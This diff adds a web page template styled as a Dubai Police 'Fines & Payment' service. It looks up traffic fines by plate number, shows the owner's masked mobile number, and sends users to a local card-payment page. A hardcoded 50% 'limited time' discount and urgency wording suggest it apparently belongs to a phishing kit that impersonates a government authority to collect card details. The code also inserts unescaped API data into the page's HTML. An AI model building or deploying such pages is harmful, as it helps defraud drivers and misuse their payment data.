@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Fines &amp; Payment | Dubai Police</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+<!-- Header -->
+<header class="app-header">
+  <button class="header-back" onclick="window.location.href='/'">‹</button>
+  <div style="flex:1;text-align:center;">
+    <div class="header-title">Fines &amp; Payment</div>
+    <div class="header-subtitle">Review your traffic fines</div>
+  </div>
+  <div style="width:36px;"></div>
+</header>
+
+<!-- Loading -->
+<div id="loading-screen" class="loading-screen">
+  <div class="spinner"></div>
+  <div class="loading-text">Checking fines...</div>
+</div>
+
+<!-- Error -->
+<div id="error-screen" style="display:none;">
+  <div class="error-box" id="error-msg"></div>
+  <div style="padding:0 16px;">
+    <button class="btn-primary" onclick="window.location.href='/'">← Try Again</button>
+  </div>
+</div>
+
+<!-- Results -->
+<div id="results-screen" style="display:none;">
+  <!-- Section header -->
+  <div class="section-title-bar">
+    <div>
+      <div class="section-title">Review Fines</div>
+      <div style="font-size:12px;color:var(--dp-muted);margin-top:2px;" id="fine-count-label"></div>
+      <div id="mobile-number-line" style="display:none;font-size:12px;color:var(--dp-green);margin-top:4px;"></div>
+    </div>
+    <div class="plate-display">
+      <span style="font-size:16px;">🇦🇪</span>
+      <span id="emirate-abbr"></span>
+      <span style="color:var(--dp-muted);">|</span>
+      <span id="plate-label"></span>
+    </div>
+  </div>
+
+  <!-- Discount Banner -->
+  <div style="margin:0 16px 12px;background:linear-gradient(135deg,#dc2626,#b91c1c);border-radius:12px;padding:10px 14px;display:flex;align-items:center;gap:10px;color:white;">
+    <span style="font-size:24px;">🎉</span>
+    <div>
+      <div style="font-weight:800;font-size:14px;">50% Fine Discount Active!</div>
+      <div style="font-size:11px;opacity:0.9;">Limited time offer — pay today and save 50% on your fines</div>
+    </div>
+    <div style="margin-left:auto;background:white;color:#dc2626;font-weight:800;font-size:13px;padding:4px 10px;border-radius:20px;white-space:nowrap;">-50%</div>
+  </div>
+
+  <!-- Filters -->
+  <div class="filter-row">
+    <button class="filter-btn active" id="filter-all" onclick="setFilter('all')">🗂 All (<span id="all-count">0</span>)</button>
+    <button class="filter-btn" id="filter-payable" onclick="setFilter('payable')">💳 Payable (<span id="payable-count">0</span>)</button>
+  </div>
+
+  <!-- Select All -->
+  <div id="select-actions" style="display:none;padding:0 16px 8px;display:flex;gap:8px;align-items:center;">
+    <button class="select-all-btn" onclick="selectAll()">Select All Payable</button>
+    <button class="select-all-btn" id="clear-btn" style="display:none;color:var(--dp-red);border-color:var(--dp-red);" onclick="clearAll()">Clear</button>
+  </div>
+
+  <!-- Fine Cards -->
+  <div class="page-content" id="fine-cards"></div>
+</div>
+
+<!-- Bottom Bar -->
+<div class="bottom-bar" id="bottom-bar" style="display:none;">
+  <div class="bottom-summary">
+    <div>
+      <div class="bottom-label" id="selected-label">0 fines selected</div>
+      <div class="bottom-label" style="font-size:11px;color:var(--dp-green);">50% discount applied</div>
+    </div>
+    <div>
+      <div class="bottom-total" id="total-amount">AED 0</div>
+    </div>
+  </div>
+  <button class="btn-primary" id="pay-btn" disabled onclick="handlePay()" style="opacity:0.4;cursor:not-allowed;">
+    Pay with Card
+  </button>
+</div>
+
+<script>
+const PLATE_NO       = <%- JSON.stringify(plateNo) %>;
+const PLATE_SRC      = <%- JSON.stringify(plateSrcCode) %>;
+const PLATE_CAT      = <%- JSON.stringify(plateCat) %>;
+const PLATE_CODE_ID  = <%- JSON.stringify(plateCodeId) %>;
+const PLATE_LETTER   = <%- JSON.stringify(plateCodeLetter) %>;
+
+let allTickets = [];
+let selected = [];
+let currentFilter = 'all';
+
+const DISCOUNT = 0.5;
+function discounted(v) { return Math.floor(v * DISCOUNT); }
+
+function getEmirateName(code) {
+  const m = {DXB:'Dubai',AUH:'Abu Dhabi',SHJ:'Sharjah',AJM:'Ajman',UAQ:'Umm Al Quwain',RAK:'Ras Al Khaimah',FUJ:'Fujairah'};
+  return m[code] || code;
+}
+
+// Set plate display
+document.getElementById('emirate-abbr').textContent = getEmirateName(PLATE_SRC).slice(0, 3).toUpperCase();
+document.getElementById('plate-label').textContent = PLATE_LETTER + ' ' + PLATE_NO;
+
+window.addEventListener('DOMContentLoaded', () => {
+  fetch('/api/search-fines', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({plateNo: PLATE_NO, plateCat: PLATE_CAT, plateSrcCode: PLATE_SRC, plateCodeId: PLATE_CODE_ID, plateCodeLetter: PLATE_LETTER})
+  })
+  .then(r => r.json().then(d => ({ok: r.ok, data: d})))
+  .then(({ok, data}) => {
+    document.getElementById('loading-screen').style.display = 'none';
+    if (!ok || data.error) {
+      document.getElementById('error-msg').textContent = '⚠️ ' + (data.error || 'Failed to retrieve fines.');
+      document.getElementById('error-screen').style.display = '';
+      return;
+    }
+    allTickets = data?.results?.tickets || [];
+    const ownerMobile = data?.results?.ownerInfo?.maskedMobileNumber;
+    if (ownerMobile) {
+      const ml = document.getElementById('mobile-number-line');
+      ml.textContent = '📱 ' + ownerMobile;
+      ml.style.display = '';
+    }
+    renderResults();
+  })
+  .catch(() => {
+    document.getElementById('loading-screen').style.display = 'none';
+    document.getElementById('error-msg').textContent = '⚠️ Connection failed. Please try again.';
+    document.getElementById('error-screen').style.display = '';
+  });
+});
+
+function renderResults() {
+  const payable = allTickets.filter(t => t.isPayable === 2);
+  document.getElementById('all-count').textContent = allTickets.length;
+  document.getElementById('payable-count').textContent = payable.length;
+  document.getElementById('fine-count-label').textContent = allTickets.length + ' fine' + (allTickets.length !== 1 ? 's' : '') + ' found';
+  document.getElementById('results-screen').style.display = '';
+  if (allTickets.length > 0) document.getElementById('bottom-bar').style.display = '';
+  if (payable.length > 0) document.getElementById('select-actions').style.display = 'flex';
+  renderCards();
+}
+
+function renderCards() {
+  const filtered = currentFilter === 'payable' ? allTickets.filter(t => t.isPayable === 2) : allTickets;
+  const container = document.getElementById('fine-cards');
+
+  if (filtered.length === 0) {
+    container.innerHTML = '<div class="empty-state"><div class="empty-icon">🎉</div><div class="empty-title">No Fines!</div><div class="empty-sub">No traffic fines found for this plate. Keep driving safely!</div></div>';
+    return;
+  }
+
+  container.innerHTML = filtered.map(ticket => {
+    const isPayable = ticket.isPayable === 2;
+    const isSelected = selected.includes(ticket.ticketId);
+    const disc = discounted(ticket.ticketTotalFine);
+    return `
+    <div class="fine-card${isSelected ? ' selected' : ''}" id="card-${ticket.ticketId}" onclick="${isPayable ? 'toggleSelect(' + ticket.ticketId + ')' : ''}" style="cursor:${isPayable ? 'pointer' : 'default'}">
+      <div class="fine-card-header">
+        <div style="display:flex;align-items:center;gap:10px;">
+          ${isPayable ? `<div class="checkbox-box${isSelected ? ' checked' : ''}" id="cb-${ticket.ticketId}">${isSelected ? '✓' : ''}</div>` : ''}
+          <span class="fine-badge ${isPayable ? 'fine-badge-payable' : 'fine-badge-paid'}">${isPayable ? 'Payable' : 'Not Payable'}</span>
+          <span style="font-size:11px;color:var(--dp-muted);">${ticket.beneficiary || ''}</span>
+        </div>
+        <div style="text-align:right;">
+          <div style="font-size:12px;color:#9ca3af;text-decoration:line-through;line-height:1.2;">AED ${ticket.ticketTotalFine.toLocaleString()}</div>
+          <div class="fine-amount"><span class="fine-amount-symbol">AED </span>${disc.toLocaleString()}</div>
+        </div>
+      </div>
+      <div class="fine-card-body">
+        <div class="fine-row"><span class="fine-row-icon">🏛</span><span class="fine-row-label">Source</span><span class="fine-row-value">${ticket.beneficiary || ''}</span></div>
+        <div class="fine-row"><span class="fine-row-icon">📍</span><span class="fine-row-label">Emirate</span><span class="fine-row-value">${ticket.pltSrcE || getEmirateName(PLATE_SRC)}</span></div>
+        ${ticket.vehicleSpeed ? `<div class="fine-row"><span class="fine-row-icon">⚡</span><span class="fine-row-label">Speed</span><span class="fine-row-value">${ticket.vehicleSpeed} km/h</span></div>` : ''}
+        <div class="fine-row"><span class="fine-row-icon">#</span><span class="fine-row-label">Ticket Number</span><span class="fine-row-value" style="font-size:12px;">${ticket.ticketNo}</span></div>
+        <div class="fine-row"><span class="fine-row-icon">📅</span><span class="fine-row-label">Date &amp; Time</span><span class="fine-row-value" style="font-size:12px;">${ticket.ticketDate} ${ticket.ticketTime}</span></div>
+        ${ticket.location ? `<div class="fine-row"><span class="fine-row-icon">📌</span><span class="fine-row-label">Location</span><span class="fine-row-value" style="font-size:12px;">${ticket.location}</span></div>` : ''}
+        <div class="fine-detail-box">
+          <div class="fine-detail-box-title">🎫 Fine Details</div>
+          <div class="fine-detail-box-text">ℹ️ ${ticket.ticketViolation || 'Traffic Violation'}</div>
+          ${ticket.knowledgeFee > 0 ? `<div style="margin-top:8px;font-size:12px;color:var(--dp-muted);">Fine: AED ${ticket.ticketFine} + Knowledge Fee: AED ${ticket.knowledgeFee}</div>` : ''}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function toggleSelect(id) {
+  const idx = selected.indexOf(id);
+  if (idx === -1) selected.push(id); else selected.splice(idx, 1);
+  updateBottomBar();
+  renderCards();
+  document.getElementById('clear-btn').style.display = selected.length > 0 ? '' : 'none';
+}
+
+function selectAll() {
+  selected = allTickets.filter(t => t.isPayable === 2).map(t => t.ticketId);
+  updateBottomBar();
+  renderCards();
+  document.getElementById('clear-btn').style.display = selected.length > 0 ? '' : 'none';
+}
+
+function clearAll() {
+  selected = [];
+  updateBottomBar();
+  renderCards();
+  document.getElementById('clear-btn').style.display = 'none';
+}
+
+function updateBottomBar() {
+  const total = selected.reduce((sum, id) => {
+    const t = allTickets.find(tt => tt.ticketId === id);
+    return sum + (t ? discounted(t.ticketTotalFine) : 0);
+  }, 0);
+  document.getElementById('selected-label').textContent = selected.length + ' fine' + (selected.length !== 1 ? 's' : '') + ' selected';
+  document.getElementById('total-amount').textContent = 'AED ' + total.toLocaleString();
+  const btn = document.getElementById('pay-btn');
+  btn.disabled = selected.length === 0;
+  btn.textContent = selected.length > 0 ? 'Pay with Card — AED ' + total : 'Pay with Card';
+  btn.style.opacity = selected.length > 0 ? '1' : '0.4';
+  btn.style.cursor = selected.length > 0 ? 'pointer' : 'not-allowed';
+}
+
+function setFilter(f) {
+  currentFilter = f;
+  document.getElementById('filter-all').classList.toggle('active', f === 'all');
+  document.getElementById('filter-payable').classList.toggle('active', f === 'payable');
+  renderCards();
+}
+
+function handlePay() {
+  if (selected.length === 0) return;
+  const total = selected.reduce((sum, id) => {
+    const t = allTickets.find(tt => tt.ticketId === id);
+    return sum + (t ? discounted(t.ticketTotalFine) : 0);
+  }, 0);
+  const violations = selected.map(id => allTickets.find(t => t.ticketId === id)?.ticketViolation).filter(Boolean).join('|');
+  const params = new URLSearchParams({plateNo: PLATE_NO, plateSrcCode: PLATE_SRC, plateCodeLetter: PLATE_LETTER, totalFine: String(total), fineCount: String(selected.length), violations});
+  window.location.href = '/payment?' + params.toString();
+}
+</script>
+</body>
+</html>
